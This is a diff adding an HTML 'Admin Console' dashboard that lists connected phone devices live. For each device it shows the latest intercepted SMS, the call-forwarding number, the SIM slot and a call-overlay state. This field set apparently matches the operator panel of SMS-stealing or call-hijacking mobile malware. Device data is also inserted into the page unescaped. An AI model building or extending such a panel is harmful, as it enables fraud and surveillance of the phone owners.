@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Console - Professional Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="/socket.io/socket.io.js"></script>
+</head>
+<body class="bg-slate-950 text-slate-100 min-h-screen font-sans">
+
+    <!-- LOGIN SECTION -->
+    <div id="loginSection" class="flex items-center justify-center min-h-screen px-4">
+        <div class="bg-slate-900 border border-slate-800 p-8 rounded-2xl shadow-2xl w-full max-w-md">
+            <div class="flex items-center space-x-2 mb-6">
+                <span class="h-3 w-3 bg-blue-500 rounded-full animate-pulse"></span>
+                <h1 class="text-xl font-semibold tracking-wide">Admin Console</h1>
+            </div>
+            <form id="loginForm" onsubmit="handleLogin(event)" class="space-y-4">
+                <div>
+                    <label class="block text-sm text-slate-400 mb-1">Username</label>
+                    <input type="text" id="username" required class="w-full bg-slate-950 border border-slate-800 rounded-lg px-4 py-2.5 focus:outline-none focus:border-blue-500 text-white">
+                </div>
+                <div>
+                    <label class="block text-sm text-slate-400 mb-1">Password</label>
+                    <input type="password" id="password" required class="w-full bg-slate-950 border border-slate-800 rounded-lg px-4 py-2.5 focus:outline-none focus:border-blue-500 text-white">
+                </div>
+                <button type="submit" class="w-full bg-blue-600 hover:bg-blue-500 transition font-medium py-2.5 rounded-lg text-white shadow-lg shadow-blue-600/30">
+                    Sign In
+                </button>
+                <p id="loginError" class="text-red-400 text-sm text-center hidden">Invalid username or password</p>
+            </form>
+        </div>
+    </div>
+
+    <!-- DASHBOARD SECTION -->
+    <div id="dashboardSection" class="hidden min-h-screen flex flex-col">
+        <!-- Top Navbar -->
+        <header class="bg-slate-900 border-b border-slate-800 px-6 py-4 flex items-center justify-between">
+            <div class="flex items-center space-x-3">
+                <span class="h-3 w-3 bg-emerald-500 rounded-full animate-ping"></span>
+                <span class="font-semibold text-lg tracking-wide">Console Dashboard</span>
+            </div>
+            <div class="flex items-center space-x-3">
+                <button onclick="requestRefresh()" class="bg-blue-600 hover:bg-blue-500 px-4 py-1.5 rounded-lg text-sm font-medium transition shadow">Refresh</button>
+                <button onclick="handleLogout()" class="bg-slate-800 hover:bg-slate-700 px-4 py-1.5 rounded-lg text-sm font-medium transition">Logout</button>
+            </div>
+        </header>
+
+        <!-- Main Content Area -->
+        <main class="flex-1 max-w-7xl w-full mx-auto p-6">
+            <div class="mb-6 flex flex-col sm:flex-row gap-4 items-center justify-between">
+                <input type="text" id="searchInput" onkeyup="filterDevices()" placeholder="Search device id, name or number..." class="w-full sm:w-96 bg-slate-900 border border-slate-800 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-blue-500">
+                <span class="text-sm text-slate-400">Connected Devices: <strong id="deviceCount" class="text-white">0</strong></span>
+            </div>
+
+            <h2 class="text-xl font-medium mb-4 text-slate-300">Active Devices & Live Details</h2>
+
+            <!-- Devices Column Grid -->
+            <div id="deviceGrid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                <div class="text-slate-500 text-center col-span-full py-16 bg-slate-900/40 rounded-xl border border-slate-800/80">
+                    Waiting for live device connection...
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        let socket;
+
+        async function handleLogin(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            try {
+                const res = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    document.getElementById('loginSection').classList.add('hidden');
+                    document.getElementById('dashboardSection').classList.remove('hidden');
+                    initSocket();
+                } else {
+                    document.getElementById('loginError').classList.remove('hidden');
+                }
+            } catch (err) {
+                console.error(err);
+            }
+        }
+
+        function handleLogout() {
+            location.reload();
+        }
+
+        function initSocket() {
+            socket = io();
+            socket.on('live_dashboard_update', (devices) => {
+                renderDevices(devices);
+            });
+        }
+
+        let allDevices = [];
+
+        function renderDevices(devices) {
+            allDevices = devices;
+            const grid = document.getElementById('deviceGrid');
+            document.getElementById('deviceCount').textContent = devices.length;
+
+            if (devices.length === 0) {
+                grid.innerHTML = `<div class="text-slate-500 text-center col-span-full py-16 bg-slate-900/40 rounded-xl border border-slate-800/80">No active devices found.</div>`;
+                return;
+            }
+
+            grid.innerHTML = devices.map(d => `
+                <div class="bg-slate-900 border border-slate-800 rounded-2xl p-5 shadow-xl flex flex-col justify-between space-y-4">
+                    <!-- Header Info -->
+                    <div>
+                        <div class="flex justify-between items-start">
+                            <span class="font-mono text-xs text-blue-400 font-semibold bg-blue-950/50 px-2 py-1 rounded border border-blue-900/50">${d.deviceId}</span>
+                            <div class="flex items-center space-x-1.5 bg-slate-950 px-2.5 py-1 rounded-full border border-slate-800">
+                                <span class="h-2 w-2 rounded-full ${d.status === 'Online' ? 'bg-emerald-500' : 'bg-rose-500'}"></span>
+                                <span class="text-[10px] uppercase tracking-wider text-slate-300 font-bold">${d.status || 'Offline'}</span>
+                            </div>
+                        </div>
+                        <div class="text-white font-bold text-lg mt-2">${d.name || 'Unknown Device'}</div>
+                    </div>
+
+                    <!-- Detailed Columns Grid -->
+                    <div class="grid grid-cols-1 gap-2.5 text-xs">
+                        <!-- Call Forwarding Column -->
+                        <div class="bg-slate-950/60 border border-slate-800/80 rounded-xl p-3 space-y-1">
+                            <div class="font-semibold text-blue-400 flex items-center justify-between border-b border-slate-800 pb-1 mb-1">
+                                <span>Call Forwarding</span>
+                                <span class="${d.callForwarding?.active ? 'text-emerald-400' : 'text-slate-500'} font-bold">${d.callForwarding?.active ? 'ACTIVE' : 'INACTIVE'}</span>
+                            </div>
+                            <div><span class="text-slate-400">Number:</span> <span class="font-mono text-white">${d.callForwarding?.number || 'N/A'}</span></div>
+                            <div><span class="text-slate-400">SIM Slot:</span> <span class="text-white">${d.callForwarding?.sim || 'SIM1'}</span></div>
+                            <div><span class="text-slate-400">Status:</span> <span class="text-slate-300">${d.callForwarding?.status || 'disabled'}</span></div>
+                        </div>
+
+                        <!-- SMS & Notifications Column -->
+                        <div class="bg-slate-950/60 border border-slate-800/80 rounded-xl p-3 space-y-1">
+                            <div class="font-semibold text-purple-400 border-b border-slate-800 pb-1 mb-1">SMS & Notifications</div>
+                            <div><span class="text-slate-400">Latest SMS:</span> <span class="text-slate-200 truncate block">${d.lastSms || 'No recent message'}</span></div>
+                            <div><span class="text-slate-400">Alerts Count:</span> <span class="text-white">${d.notificationCount || '0'}</span></div>
+                        </div>
+
+                        <!-- Call Over Display Column -->
+                        <div class="bg-slate-950/60 border border-slate-800/80 rounded-xl p-3 space-y-1">
+                            <div class="font-semibold text-amber-400 border-b border-slate-800 pb-1 mb-1">Call Over Display</div>
+                            <div><span class="text-slate-400">Overlay State:</span> <span class="${d.callOverlay?.active ? 'text-emerald-400' : 'text-slate-500'}">${d.callOverlay?.active ? 'Showing' : 'Hidden'}</span></div>
+                            <div><span class="text-slate-400">Active Number:</span> <span class="font-mono text-white">${d.callOverlay?.currentCallNumber || 'None'}</span></div>
+                        </div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function filterDevices() {
+            const query = document.getElementById('searchInput').value.toLowerCase();
+            const filtered = allDevices.filter(d => 
+                d.deviceId.toLowerCase().includes(query) || 
+                (d.name && d.name.toLowerCase().includes(query)) ||
+                (d.callForwarding?.number && d.callForwarding.number.includes(query))
+            );
+            renderDevices(filtered);
+        }
+
+        function requestRefresh() {
+            if(socket) socket.emit('request_sync');
+        }
+    </script>
+</body>
+</html>
